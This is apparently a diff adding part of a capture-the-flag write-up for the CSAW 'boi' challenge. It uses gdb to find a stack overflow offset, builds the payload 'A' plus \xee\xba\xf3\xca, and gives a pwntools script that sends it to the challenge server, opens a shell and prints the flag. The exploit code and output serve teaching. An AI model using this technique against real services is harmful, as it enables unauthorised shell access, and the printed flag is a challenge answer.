@@ -114,4 +114,87 @@ So looking at attack vectors there is the input. To test how much we need to ove
 (gdb) break *main+103
 Breakpoint 1 at 0x4006a8
 (gdb) run
-Starting/program
+Starting program: /root/InfoSec-Lessons/boi 
+Are you a big boiiiii??
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
+
+Breakpoint 1, 0x00000000004006a8 in main ()
+(gdb) GGGGHHHH
+Undefined command: "GGGGHHHH".  Try "help".
+(gdb) i r eax
+eax            0x46464646	1179010630
+(gdb)
+```
+`0x46` is the value F so that means the 4 Fs are our payload
+
+Run it again:
+```
+(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /root/InfoSec-Lessons/boi 
+Are you a big boiiiii??
+AAAABBBBCCCCDDDDEEEEabcd
+
+Breakpoint 1, 0x00000000004006a8 in main ()
+(gdb) 
+(gdb) i r eax
+eax            0x64636261	1684234849
+(gdb)
+```
+
+The `0x64` is the value for `d` that means little endian. Great lets try our exploit.
+
+So our exploit is `"A" + "\xee\xba\xf3\xca"`
+
+Now we need to deliver it through netcat. 
+`nc pwn.chal.csaw.io 9000`
+
+So we need pwn tools to do this. Specifically the remote command
+
+The result is:
+```python
+from pwn import *
+import string
+
+r = remote('pwn.chal.csaw.io', 9000)
+print r.recvuntil('Are you a big boiiiii??')
+
+
+print r.send("aaaabbbbccccddddeeee\xee\xba\xf3\xca")
+
+print r.recv()
+
+r.interactive()
+```
+
+Now lets try it out
+
+```
+> python big_pwn.py
+[+] Opening connection to pwn.chal.csaw.io on port 9000: Done
+ _    ___        ____   ___  _ _ _ _ 
+| |__|_ _|__ _  | __ ) / _ \(_|_|_|_)
+| '_ \| |/ _` | |  _ \| | | | | | | |
+| |_) | | (_| | | |_) | |_| | | | | |
+|_.__/___\__, | |____/ \___/|_|_|_|_|
+         |___/                       
+***************************************
+Are you a big boiiiii??
+None
+
+
+[*] Switching to interactive mode
+aaaabbbbccccddddeeee����ls
+ls
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+bigboy@52c491e1e9ec:~$ ls
+art.txt  boi  flag.txt  run.sh
+bigboy@52c491e1e9ec:~$ $ cat flag.txt
+cat flag.txt
+flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}
+```
+
+There is the flag
+
